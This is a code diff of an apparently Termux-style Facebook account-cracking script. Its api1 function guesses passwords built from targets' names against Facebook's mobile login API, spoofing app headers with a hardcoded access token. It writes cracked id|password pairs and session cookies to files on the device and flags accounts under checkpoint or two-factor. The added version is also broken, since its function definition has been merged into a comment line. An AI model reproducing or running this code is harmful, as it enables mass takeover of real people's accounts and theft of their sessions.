@@ -1423,116 +1423,109 @@ try:
 except requests.RequestException as e:
     print("An error occurred:", e)
     """
-#def api1(ids, names, passlist, proxies_list):
-def api1(ids, names, passlist):
-    try:
-        global ok, loop, sim_id
-        sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)))
-        sys.stdout.flush()
-        
-        fn = names.split(' ')[0]
+#def api1(ids, names, passlist, proxies_list):def api1(ids,names,passlist):
         try:
-            ln = names.split(' ')[1]
-        except:
-            ln = fn
-        
-       
-            session = requests.Session()
-           
-            
-            for pw in passlist:
-                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
-                fbbv = str(random.randint(111111111, 999999999))
-                android_version = device['android_version']
-                model = device['model']
-                build = device['build']
-                fblc = device['fblc']
-                fbcr = sim_id
-                fbmf = device['fbmf']
-                fbbd = device['fbbd']
-                fbdv = device['fbdv']
-                fbsv = device['fbsv']
-                fbca = device['fbca']
-                fbdm = device['fbdm']
-                fbfw = '1'
-                fbrv = '0'
-                fban = 'FB4A'
-                fbpn = 'com.facebook.katana'
-                ua = 'Davik/2.1.0 (Linux; U; Android ' + android_version + '.0.1; ' + model + ' Build/' + build + ') [FBAN/' + fban + ';FBAV/' + fbav + ';FBBV/' + fbbv + ';FBDM/{density=3.0,width=1440,height=8797};FBLC/' + fblc + ';FBRV/' + str(random.randint(000000000, 999999999)) + ';FBCR/' + fbcr + ';FBMF/' + fbmf + ';FBBD/' + fbbd + ';FBPN/' + fbpn + ';FBDV/' + fbdv + ';FBSV/' + fbsv + ';FBOP/19;FBCA/' + fbca + ';]'
-                random_seed = random.Random()
-                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                device_id = str(uuid.uuid4())
-                secure = str(uuid.uuid4())
-                family = str(uuid.uuid4())
-                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                xd = str(''.join(random_seed.choices(string.digits, k=20)))
-                sim_serials = f'["{xd}"]'
-                li = ['28', '29', '210']
-                li2 = random.choice(li)
-                j1 = ''.join(random.choice(digits) for _ in range(2))
-                jazoest = li2 + j1
-                data = {
-                    "adid": adid,
-                    "format": "json",
-                    "device_id": str(uuid.uuid4()),
-                    "email": ids,
-                    "password": pas,
-                    "generate_analytics_claims": "1",
-                    "credentials_type": "password",
-                    "source": "login",
-                    "error_detail_type": "button_with_disabled",
-                    "enroll_misauth": "false",
-                    "generate_session_cookies": "1",
-                    "generate_machine_id": "1",
-                    "fb_api_req_friendly_name": "authenticate",
-                }
-                headers = {
-                    "Accept-Encoding": "gzip, deflate",
-                    "Accept": "*/*",
-                    "Connection": "keep-alive",
-                    "User-Agent": ONE(),
-                    "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-                    "X-FB-Friendly-Name": "authenticate",
-                    "X-FB-Connection-Type": "unknown",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "X-FB-HTTP-Engine": "Liger",
-                    "Content-Length": "329",
-                }
-                url = 'https://b-graph.facebook.com/auth/login'
-                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                po = session.post(url, data=data, headers=headers).json()
-                if 'session_key' in po:
-                    print('\r\r\033[1;32m [NOT-ANKIT->OK] ' + ids + ' | ' + pas + '\033[1;97m')
-                    coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
-                    open('/sdcard/NOY-ANKIT-COKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
-                    open('/sdcard/NOT-ANKIT-OK.txt', 'a').write(ids + '|' + pas + '\n')
-                    oks.append(ids)
-                    break
-                elif twf in str(po):
-                    if 'y' in pcp:
-                        print('\r\r \033[1;34m[ANKIT-2F] ' + ids + ' | ' + pas)
-                        twf.append(ids)
-                        break
-                elif 'www.facebook.com' in po['error']['message']:
-                    if 'y' in pcp:
-                        print('\r\r\x1b[38;5;205m [ANKIT-CP] ' + ids + ' | ' + pas + '\033[1;97m')
-                        open('/sdcard/ANKIT-CP.txt', 'a').write(ids + '|' + pas + '\n')
-                        break
-                        cps.append(ids)
-                    else:
-                        open('/sdcard/ANKIT-CP.txt', 'a').write(ids + '|' + pas + '\n')
-                        break
-                        cps.append(ids)
-                else:
-                    continue
-                loop += 1
-    except requests.exceptions.ConnectionError:
-        time.sleep(20)
-    except Exception as e:
-        
-        pass
+                global ok,loop,sim_id
+                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                fn = names.split(' ')[0]
+                try:
+                        ln = names.split(' ')[1]
+                except:
+                        ln = fn
+                session = requests.Session()
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                "adid": adid,
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"email": ids,
+"password": pas,
+"generate_analytics_claims": "1",
+"credentials_type": "password",
+"source": "login",
+"error_detail_type": "button_with_disabled",
+"enroll_misauth": "false",
+"generate_session_cookies": "1",
+"generate_machine_id": "1",
+"fb_api_req_friendly_name": "authenticate",}
+                        headers={
+                                "Accept-Encoding": "gzip, deflate",
+"Accept": "*/*",
+"Connection": "keep-alive",
+"User-Agent": ONE(),
+"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+"X-FB-Friendly-Name": "authenticate",
+"X-FB-Connection-Type": "unknown",
+"Content-Type": "application/x-www-form-urlencoded",
+"X-FB-HTTP-Engine": "Liger",
+"Content-Length": "329",}
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                        print('\r\r\033[1;32m [NOT-ANKIT->OK] '+ids+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        #print("Cookie: "+coki)
+                                       #print("\033[1;32mChecking active and expired apps...\033[0m
+                                        open('/sdcard/NOY-ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/NOT-ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                        elif twf in str(po):
+                                        if 'y' in pcp:
+                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
+                                                twf.append(ids)
+                                                break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                                        else:
+                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                                cps.append(ids)
+                        else:
+                                        continue
+                loop+=1
+        except requests.exceptions.ConnectionError:
+                #print("Internet Connection Error\nSleeping for 60s")
+                time.sleep(20)               
+        except Exception as e:               
+                pass
 
 # Assuming 'device' and 'ONE' functions are defined elsewhere in your code.
 
